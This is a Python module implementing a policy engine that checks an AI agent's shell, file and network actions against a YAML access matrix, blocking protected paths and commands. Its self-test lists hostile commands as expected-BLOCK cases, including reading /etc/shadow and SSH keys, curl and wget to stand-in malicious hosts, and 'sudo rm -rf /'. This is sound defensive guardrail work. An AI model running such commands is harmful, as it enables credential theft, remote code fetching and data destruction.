"""
Policy Engine — The Access-Matrix Evaluator
=============================================
This module loads a YAML policy file and evaluates agent actions against it.

How it maps to classical OS security theory:
  - The YAML file IS the access matrix (Lampson, 1971)
  - Rows = the AI agent (subject)
  - Columns = system resources: files, commands, network (objects)
  - Cells = ALLOW, BLOCK, or FLAG (permissions)

The engine checks every action the agent wants to take BEFORE it executes.
If the action is blocked, it never reaches the OS kernel.

Key concepts:
  - Glob matching: '/tmp/*' means 'any path starting with /tmp/'
  - First-match wins: rules are checked in order, first match determines the decision
  - Default action: if no rule matches, the default_action from the policy applies
  - Logging: every decision is written to logs/guardrails.jsonl for the dashboard
"""

import os
import re
import sys
import json
import hashlib
import fnmatch
import datetime
import posixpath

import yaml

from src.policy_engine.shell_split import parse_shell, ShellParseError, _FIND_EXEC

# Project root for resolving relative paths
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))

# Where policy decisions are logged (read by the dashboard)
LOG_FILE = os.path.join(PROJECT_ROOT, 'logs', 'guardrails.jsonl')

# Default policy file path
DEFAULT_POLICY = os.path.join(os.path.dirname(__file__), 'policies', 'default_policy.yaml')


# The agent's world (SandboxExecutor sets HOME and the Environment sets the cwd). Paths
# are resolved against these before any rule is applied, because the shell does the
# same: `~`, `$HOME`, relative names and `..` all become absolute paths at run time.
AGENT_HOME = '/home/user'
AGENT_CWD = '/home/user/workspace'

_HOME_VAR = re.compile(r'\$(?:\{HOME\}|HOME)(?=/|$)')
_PWD_VAR = re.compile(r'\$(?:\{PWD\}|PWD)(?=/|$)')
_TILDE = re.compile(r'~([A-Za-z0-9._+-]*)(?=/|$)')
_GLOB_META = re.compile(r'[*?\[]')

# Commands that open their operands as files. For these, an operand that cannot be
# resolved statically ($VAR, $(...), a cwd changed by an unresolvable `cd`) is refused;
# for echo/date/... it is only text.
_FILE_COMMANDS = {
    'cat', 'tac', 'nl', 'head', 'tail', 'less', 'more', 'grep', 'egrep', 'fgrep', 'zgrep',
    'rgrep', 'rg', 'ag', 'ack', 'wc', 'sort', 'uniq', 'cut', 'paste', 'join', 'comm', 'cmp',
    'diff', 'tee', 'cp', 'mv', 'ln', 'sed', 'awk', 'gawk', 'od', 'xxd', 'hexdump', 'strings',
    'base64', 'base32', 'md5sum', 'sha1sum', 'sha256sum', 'sha512sum', 'cksum', 'file', 'stat',
    'touch', 'truncate', 'split', 'nano', 'vi', 'vim', 'tar', 'zip', 'unzip', 'gzip', 'gunzip',
    'zcat', 'bzcat', 'xzcat',
}
# Recursive by nature, or recursive when given -r/-R/--recursive
_ALWAYS_RECURSIVE = {'rgrep', 'rg', 'ag', 'ack', 'tree', 'tar', 'zip', '7z', '7za', 'cpio'}
_RECURSIVE_WITH_FLAG = {'grep', 'egrep', 'fgrep', 'zgrep', 'cp', 'diff', 'du', 'scp'}
_CD_COMMANDS = {'cd', 'pushd', 'popd', 'chdir'}


def _expand_home(path: str) -> str:
    """Expand a leading ~, ~user, $HOME, ${HOME}, $PWD the way the shell would."""
    for pattern, home in ((_HOME_VAR, AGENT_HOME), (_PWD_VAR, AGENT_CWD)):
        m = pattern.match(path)
        if m:
            return home + path[m.end():]
    m = _TILDE.match(path)
    if m:
        user = m.group(1)
        if user in ('', 'user'):
            home = AGENT_HOME
        elif user in ('+', '-'):
            home = AGENT_CWD
        elif user == 'root':
            home = '/root'
        else:
            home = '/home/' + user
        return home + path[m.end():]
    return path


def _normalize_path(path: str, cwd: str = AGENT_CWD) -> str:
    """Absolute, `.`/`..`-resolved path with a single leading slash (POSIX normpath
    keeps exactly two leading slashes, so `//etc/shadow` would otherwise dodge `/etc/*`)."""
    path = _expand_home(path)
    if not path.startswith('/'):
        path = cwd + '/' + path
    return re.sub(r'^/+', '/', posixpath.normpath(path))


class _TooManyBraces(Exception):
    pass


def _brace_group(s: str):
    """First balanced {a,b} / {1..3} group in s as (start, end, alternatives), or None."""
    i = 0
    while i < len(s):
        if s[i] == '{':
            depth, j, commas = 1, i + 1, []
            while j < len(s) and depth:
                if s[j] == '{':
                    depth += 1
                elif s[j] == '}':
                    depth -= 1
                elif s[j] == ',' and depth == 1:
                    commas.append(j)
                j += 1
            if depth == 0:
                inner = s[i + 1:j - 1]
                if commas:
                    cuts = [i] + commas + [j - 1]
                    return i, j, [s[cuts[k] + 1:cuts[k + 1]] for k in range(len(cuts) - 1)]
                seq = re.fullmatch(r'(-?\d+)\.\.(-?\d+)', inner)
                if seq:
                    a, b = int(seq.group(1)), int(seq.group(2))
                    step = 1 if b >= a else -1
                    if abs(b - a) > 256:
                        raise _TooManyBraces()
                    return i, j, [str(n) for n in range(a, b + step, step)]
        i += 1
    return None


def _expand_braces(s: str, limit: int = 256) -> list:
    group = _brace_group(s)
    if group is None:
        return [s]
    start, end, alternatives = group
    out = []
    for alt in alternatives:
        out.extend(_expand_braces(s[:start] + alt + s[end:], limit))
        if len(out) > limit:
            raise _TooManyBraces()
    return out


def _segments(path: str) -> list:
    return [seg for seg in path.split('/') if seg]


def _seg_compatible(a: str, b: str) -> bool:
    """Could two path components (either may be a glob) denote the same name?"""
    glob_a, glob_b = bool(_GLOB_META.search(a)), bool(_GLOB_META.search(b))
    if glob_a and glob_b:
        return True                       # cannot decide; assume they can
    if glob_a:
        return fnmatch.fnmatchcase(b, a)
    if glob_b:
        return fnmatch.fnmatchcase(a, b)
    return a == b


def _glob_overlaps(arg: list, rule: list) -> bool:
    """Could the glob path `arg` expand to a path that the rule pattern matches?"""
    for i, part in enumerate(rule):
        if i >= len(arg):
            return False
        if part == '*' and i == len(rule) - 1:
            return True                   # a trailing * (fnmatch) swallows any depth
        if not _seg_compatible(arg[i], part):
            return False
    return len(arg) == len(rule)


def _covers(directory: list, rule: list) -> bool:
    """Is `directory` an ancestor of (or the same as) something the rule can match?"""
    if len(directory) > len(rule):
        return False                      # deeper than the rule: direct matching handles it
    return all(_seg_compatible(directory[i], rule[i]) for i in range(len(directory)))


class _Ctx:
    """Where relative paths may point while one command string runs."""

    def __init__(self, cwds, unknown=False):
        self.cwds = list(cwds)
        self.unknown = unknown            # a `cd` target could not be resolved statically


_DEFAULT_CTX = _Ctx([AGENT_CWD])


# Action types whose target must be a (non-empty) string for the policy to judge it
_TARGETED_ACTIONS = {"run_shell", "read_file", "write_file", "http_request", "call_tool"}


class PolicyEngine:
    """Evaluates agent actions against the access-matrix policy.
    
    Usage:
        engine = PolicyEngine()  # loads default policy
        decision = engine.check('read_file', '/etc/shadow')  # returns 'BLOCK'
        decision = engine.check('run_shell', 'ls /tmp')       # returns 'ALLOW'
    """

    def __init__(self, policy_path: str = None, log_file: str = None, verbose: bool = True):
        """Load the policy YAML file.
        
        Args:
            policy_path: Path to a YAML policy file. Uses default if None.
            log_file: Decision log (JSON Lines). Defaults to logs/guardrails.jsonl,
                      which the dashboard reads; the benchmark uses its own.
            verbose: Print a summary when the policy is loaded.
        """
        policy_path = policy_path or DEFAULT_POLICY
        
        if not os.path.exists(policy_path):
            print(f"ERROR: Policy file not found: {policy_path}")
            sys.exit(1)
        
        # Read the bytes once: the hash identifies exactly which policy produced a result
        with open(policy_path, 'rb') as f:
            raw = f.read()
        self.policy_path = os.path.abspath(policy_path)
        self.policy_sha256 = hashlib.sha256(raw).hexdigest()
        self.policy = yaml.safe_load(raw.decode('utf-8'))
        
        self.default_action = self.policy.get('default_action', 'FLAG')
        
        # Ensure the log directory exists
        self.log_file = log_file
        os.makedirs(os.path.dirname(self._log_path()), exist_ok=True)

        if verbose:
            print(f"[POLICY ENGINE] Loaded policy from: {os.path.basename(policy_path)}")
            print(f"[POLICY ENGINE] Default action: {self.default_action}")

    def _log_path(self) -> str:
        # Resolved at call time so tests can redirect the module-level default
        return self.log_file or LOG_FILE

    def check(self, action_type: str, target: str) -> str:
        """Check if an action is allowed by the policy.
        
        Args:
            action_type: Type of action ('run_shell', 'read_file', 'write_file', 
                         'http_request', 'respond')
            target: The target of the action (command string, file path, or URL)
        
        Returns:
            'ALLOW', 'BLOCK', or 'FLAG'
        """
        return self.check_detailed(action_type, target)[0]

    def check_detailed(self, action_type: str, target: str) -> tuple:
        """Like check(), but returns (decision, reason) so the agent can be told why."""
        decision = self.default_action
        reason = "No matching rule (default action applied)"

        if action_type == "respond":
            # Text-only responses are always allowed (no system interaction)
            decision = "ALLOW"
            reason = "Text responses are always allowed"

        elif action_type in _TARGETED_ACTIONS and (
                not isinstance(target, str)
                or (action_type != "call_tool" and not target.strip())):
            # The model controls these values and parse_action does not validate types.
            # A list/number/null/missing target cannot be judged, so it is refused.
            decision, reason = "BLOCK", "Missing or non-text action target (fail closed)"

        elif action_type == "run_shell":
            decision, reason = self._check_shell_command(target)

        elif action_type == "read_file":
            decision, reason = self._check_filesystem(target, 'read')

        elif action_type == "write_file":
            decision, reason = self._check_filesystem(target, 'write')

        elif action_type == "http_request":
            decision, reason = self._check_network(target)

        # Log every decision for the dashboard
        self._log_decision(action_type, target, decision, reason)

        return decision, reason

    def _check_shell_command(self, command: str) -> tuple:
        """Check a shell command against process execution rules.

        The executor hands the whole string to /bin/sh, so the policy must see
        every simple command the shell would run, not just the first word.
        parse_shell() splits the string; each piece is checked on its own and
        the first BLOCK wins. Input that cannot be parsed is refused.
        """
        try:
            commands = parse_shell(command)
        except ShellParseError as e:
            return ('BLOCK', f"Unparseable shell command (fail closed): {e}")

        if not commands:
            return (self.default_action, "Command '' has no matching rule")

        ctx = self._cwd_context(commands)
        results = [(cmd, self._check_simple_command(cmd, ctx)) for cmd in commands]

        for cmd, (decision, reason) in results:
            if decision == 'BLOCK':
                if len(commands) == 1:
                    return ('BLOCK', reason)
                return ('BLOCK', f"Sub-command '{cmd.text}' blocked: {reason}")

        for cmd, (decision, reason) in results:
            if decision != 'ALLOW':
                if len(commands) == 1:
                    return (decision, reason)
                return (decision, f"Sub-command '{cmd.text}': {reason}")

        if len(commands) == 1:
            return results[0][1]
        return ('ALLOW', f"All {len(commands)} sub-commands are in the allow list")

    def _cwd_context(self, commands) -> _Ctx:
        """Every directory a relative path could be relative to while this string runs.

        Relative operands are resolved against the workspace, but a `cd` changes that
        for the commands after it (and `cd /etc || cd /tmp; cat shadow` makes it
        ambiguous), so each `cd` target is added and operands are checked against all of
        them. A `cd` whose target is only known at run time makes relative paths
        undecidable (ctx.unknown).
        """
        cwds, unknown = [AGENT_CWD], False
        for cmd in commands:
            if not cmd.argv or posixpath.basename(cmd.argv[0]) not in _CD_COMMANDS:
                continue
            if posixpath.basename(cmd.argv[0]) == 'popd':
                unknown = True
                continue
            operands = [(i, a) for i, a in enumerate(cmd.argv[1:], 1)
                        if not (a.startswith('-') and len(a) > 1)]
            if not operands:
                targets = [AGENT_HOME]                    # bare `cd` goes home
            else:
                i, target = operands[0]
                if target == '-':
                    continue                              # back to a directory already tracked
                expanded = _expand_home(target)
                if ('$' in expanded and cmd.dynamic_at(i)) or '\x00' in expanded \
                        or (cmd.glob_at(i) and any(c in expanded for c in '*?[{')):
                    unknown = True
                    continue
                targets = [_normalize_path(expanded, c) for c in cwds]
            for t in targets:
                if t not in cwds:
                    cwds.append(t)
            if len(cwds) > 16:
                unknown = True
        return _Ctx(cwds, unknown)

    def _check_simple_command(self, cmd, ctx: _Ctx = _DEFAULT_CTX) -> tuple:
        """Check one simple command (already split out of any chain)."""
        process_rules = self.policy.get('process', {})
        argv = cmd.argv

        # Redirection targets are file accesses the shell makes on the command's behalf
        for target in cmd.writes:
            reason = self._check_path_operand(target, False, True, 'write', True, False, ctx)
            if reason:
                return ('BLOCK', f"Redirect to '{target}' is blocked: {reason}")
        for target in cmd.reads:
            reason = self._check_path_operand(target, False, True, 'read', True, False, ctx)
            if reason:
                return ('BLOCK', f"Redirect from '{target}' is blocked: {reason}")

        if not argv:
            return ('ALLOW', 'No command to run')

        base_cmd = os.path.basename(argv[0])

        # Check block list first (security: deny takes priority)
        for blocked in process_rules.get('block', []):
            if self._rule_matches(blocked, argv):
                return ('BLOCK', f"Command '{base_cmd}' is in the block list")

        # Whatever the command is (allow-listed or not), the files it names must not be
        # protected ones: `strings /etc/shadow` has no rule but is no safer than `cat`.
        fs_decision, fs_reason = self._check_command_file_args(cmd, ctx)
        if fs_decision == 'BLOCK':
            return ('BLOCK', fs_reason)

        # Check allow list
        for allowed in process_rules.get('allow', []):
            if base_cmd == allowed:
                return ('ALLOW', f"Command '{base_cmd}' is in the allow list")

        return (self.default_action, f"Command '{base_cmd}' has no matching rule")

    @staticmethod
    def _rule_matches(rule: str, argv: list) -> bool:
        """Does a process block rule match this command?

        The first token of the rule must equal the command word's basename (so the
        rule `su` does not catch `sum`, nor `sh` catch `sha256sum`). Further tokens
        (`pip install`) must appear, in order, among the non-option arguments, so
        `pip -q install x` and `pip --index-url U install x` are caught like
        `pip install x`.
        """
        parts = rule.split()
        if not parts or os.path.basename(argv[0]) != parts[0]:
            return False
        operands = iter(a for a in argv[1:] if not a.startswith('-'))
        return all(token in operands for token in parts[1:])

    @staticmethod
    def _is_recursive(base: str, argv: list) -> bool:
        """Will this command walk into the directories it is given?"""
        if base in _ALWAYS_RECURSIVE:
            return True
        if base == 'find':
            return any(a in _FIND_EXEC for a in argv)     # plain find only lists names
        if base in _RECURSIVE_WITH_FLAG:
            for i, a in enumerate(argv[1:], 1):
                if a == '--':
                    break
                if a in ('--recursive', '--dereference-recursive') \
                        or a.startswith('--directories=recurse'):
                    return True
                if a in ('-d', '--directories') and argv[i + 1:i + 2] == ['recurse']:
                    return True
                if a.startswith('-') and not a.startswith('--') and len(a) > 1:
                    letters = 'rRa' if base == 'cp' else 'rR'
                    if any(ch in letters for ch in a[1:]):
                        return True
        return False

    @staticmethod
    def _operand_candidates(arg: str) -> list:
        """The path-like parts of one argument: the argument itself, or for options the
        value in `--opt=/path` and in a glued short form such as `-f/path`."""
        if arg.startswith('-') and len(arg) > 1:
            if '=' in arg:
                value = arg.split('=', 1)[1]
            elif '/' in arg:
                value = arg[arg.index('/'):]
            else:
                return []
            return [value] if value else []
        return [arg]

    def _check_command_file_args(self, cmd, ctx: _Ctx = _DEFAULT_CTX) -> tuple:
        """Check if a shell command's file arguments are allowed.

        e.g., 'cat /etc/shadow' — 'cat' is allowed but '/etc/shadow' is blocked. The
        arguments are judged as the shell will see them: `~`/$HOME expanded, relative
        names and `..` resolved against the working directory, `//` collapsed, globs
        and braces expanded in the abstract, option values (`--file=/path`) included.
        What cannot be resolved statically is refused for file-reading commands.
        """
        argv = cmd.argv
        base = os.path.basename(argv[0]) if argv else ''
        strict = base in _FILE_COMMANDS
        if cmd.stdin_args and strict:
            return ('BLOCK', f"File names for '{base}' are read from standard input by xargs "
                             f"and cannot be checked (fail closed)")
        if len(argv) <= 1:
            return ('ALLOW', 'No file arguments')

        recursive = self._is_recursive(base, argv)

        for i, arg in enumerate(argv[1:], 1):
            if arg == '-':
                continue
            dynamic, glob = cmd.dynamic_at(i), cmd.glob_at(i)
            for candidate in self._operand_candidates(arg):
                reason = self._check_path_operand(candidate, dynamic, glob, 'read',
                                                  strict, recursive, ctx)
                if reason:
                    return ('BLOCK', f"File argument '{arg}' is blocked: {reason}")

        return ('ALLOW', 'File arguments are allowed')

    def _check_path_operand(self, text: str, dynamic: bool, glob: bool, operation: str,
                            strict: bool, recursive: bool, ctx: _Ctx):
        """Judge one path operand. Returns a reason string if it must be BLOCKed, else None.

        `strict` (the command opens its operands): an operand that is only known at run
        time is refused. `recursive`: a directory that contains protected paths is refused.
        """
        expanded = _expand_home(text)
        if dynamic and ('$' in expanded or '\x00' in expanded):
            return "dynamic file argument cannot be checked (fail closed)" if strict else None
        if not expanded.startswith('/') and ctx.unknown:
            return ("relative path after a directory change that cannot be resolved "
                    "(fail closed)") if strict else None

        variants = [expanded]
        if glob and any(c in expanded for c in '*?[{'):
            try:
                variants = _expand_braces(expanded)
            except _TooManyBraces:
                return "brace expansion too large to check (fail closed)" if strict else None

        for variant in variants:
            paths = [_normalize_path(variant)] if variant.startswith('/') else \
                sorted({_normalize_path(variant, cwd) for cwd in ctx.cwds})
            for path in paths:
                if glob and _GLOB_META.search(path):
                    rule = self._glob_hits_protected(path, operation, recursive)
                    if rule:
                        return f"glob '{text}' can match a protected path (rule: {rule})"
                    continue
                decision, reason = self._check_filesystem(path, operation)
                if decision == 'BLOCK':
                    return reason
                if recursive:
                    rule = self._dir_covers_protected(path, operation)
                    if rule:
                        return (f"recursive access to '{path}' would reach protected "
                                f"paths (rule: {rule})")
        return None

    def _block_rules(self, operation: str) -> list:
        return (self.policy.get('filesystem', {}).get(operation, {}) or {}).get('block', []) or []

    def _glob_hits_protected(self, pattern_path: str, operation: str, recursive: bool):
        arg = _segments(pattern_path)
        for rule in self._block_rules(operation):
            rule_segments = _segments(rule)
            if _glob_overlaps(arg, rule_segments) or (recursive and _covers(arg, rule_segments)):
                return rule
        return None

    def _dir_covers_protected(self, path: str, operation: str):
        directory = _segments(path)
        for rule in self._block_rules(operation):
            if _covers(directory, _segments(rule)):
                return rule
        return None

    def _check_filesystem(self, path: str, operation: str) -> tuple:
        """Check a file path against filesystem access rules.
        
        Uses glob-style matching: '/tmp/*' matches '/tmp/foo.txt'
        """
        fs_rules = self.policy.get('filesystem', {})
        op_rules = fs_rules.get(operation, {})

        # Normalize the path: ~ and $HOME expanded, relative names resolved against the
        # workspace, `..` and a leading `//` collapsed
        path = _normalize_path(path)

        # Check block list first
        for pattern in op_rules.get('block', []):
            if fnmatch.fnmatch(path, pattern):
                return ('BLOCK', f"Path '{path}' matches block rule: {pattern}")

        # Check allow list
        for pattern in op_rules.get('allow', []):
            if fnmatch.fnmatch(path, pattern):
                return ('ALLOW', f"Path '{path}' matches allow rule: {pattern}")

        return (self.default_action, f"Path '{path}' has no matching rule")

    def _check_network(self, url: str) -> tuple:
        """Check a URL/network target against network access rules."""
        net_rules = self.policy.get('network', {})

        # Check block list
        for pattern in net_rules.get('block', []):
            if pattern == '*' or fnmatch.fnmatch(url, pattern):
                return ('BLOCK', f"Network access blocked (matches: {pattern})")

        # Check allow list
        for pattern in net_rules.get('allow', []):
            if fnmatch.fnmatch(url, pattern):
                return ('ALLOW', f"URL matches allow rule: {pattern}")

        return (self.default_action, f"URL '{url}' has no matching rule")

    def record_decision(self, action_type: str, target, decision: str, reason: str):
        """Log a decision made outside check_detailed (e.g. an action refused before it
        could be evaluated), in the same format the dashboard reads."""
        self._log_decision(action_type, target if isinstance(target, str) else repr(target),
                           decision, reason)

    def _log_decision(self, action_type: str, target: str, decision: str, reason: str, layer: str = "policy_engine"):
        """Write a decision to the JSON Lines log file.
        
        Format: one JSON object per line, read by the dashboard.
        """
        entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "action": action_type,
            "target": target if isinstance(target, str) else repr(target),
            "decision": decision,
            "reason": reason,
            "layer": layer
        }
        
        try:
            with open(self._log_path(), 'a') as f:
                f.write(json.dumps(entry) + '\n')
        except Exception as e:
            print(f"  Warning: Could not write to log file: {e}")

    def get_policy_summary(self) -> str:
        """Return a human-readable summary of the loaded policy."""
        fs = self.policy.get('filesystem', {})
        proc = self.policy.get('process', {})
        net = self.policy.get('network', {})
        
        summary = []
        summary.append(f"Default action: {self.default_action}")
        summary.append(f"File read:  {len(fs.get('read', {}).get('allow', []))} allow, {len(fs.get('read', {}).get('block', []))} block rules")
        summary.append(f"File write: {len(fs.get('write', {}).get('allow', []))} allow, {len(fs.get('write', {}).get('block', []))} block rules")
        summary.append(f"Process:    {len(proc.get('allow', []))} allow, {len(proc.get('block', []))} block rules")
        summary.append(f"Network:    {len(net.get('allow', []))} allow, {len(net.get('block', []))} block rules")
        return '\n'.join(summary)


# ── Standalone test: run this file directly to verify the engine works ──
if __name__ == "__main__":
    print("\n" + "="*50)
    print("  Policy Engine — Standalone Test")
    print("="*50)
    
    engine = PolicyEngine()
    print(f"\nPolicy Summary:\n{engine.get_policy_summary()}")
    
    # Test cases — these should produce the expected results
    test_cases = [
        ("run_shell",    "ls /tmp",                        "ALLOW"),
        ("run_shell",    "cat /etc/shadow",                 "BLOCK"),
        ("run_shell",    "curl http://evil.com",            "BLOCK"),
        ("run_shell",    "sudo rm -rf /",                   "BLOCK"),
        ("run_shell",    "wget http://malware.com/bad.sh",  "BLOCK"),
        ("read_file",    "/tmp/test.txt",                   "ALLOW"),
        ("read_file",    "/etc/shadow",                     "BLOCK"),
        ("read_file",    "/home/user/.ssh/id_rsa",          "BLOCK"),
        ("write_file",   "/tmp/output.txt",                 "ALLOW"),
        ("write_file",   "/etc/crontab",                    "BLOCK"),
        ("http_request", "http://example.com",              "BLOCK"),
        ("respond",      "Hello, how can I help?",          "ALLOW"),
    ]
    
    print(f"\n{'Action':<15} {'Target':<40} {'Expected':<10} {'Got':<10} {'Status'}")
    print("-" * 95)
    
    passed = 0
    for action, target, expected in test_cases:
        result = engine.check(action, target)
        status = "✅" if result == expected else "❌"
        if result == expected:
            passed += 1
        print(f"{action:<15} {target:<40} {expected:<10} {result:<10} {status}")
    
    print(f"\nResults: {passed}/{len(test_cases)} passed")
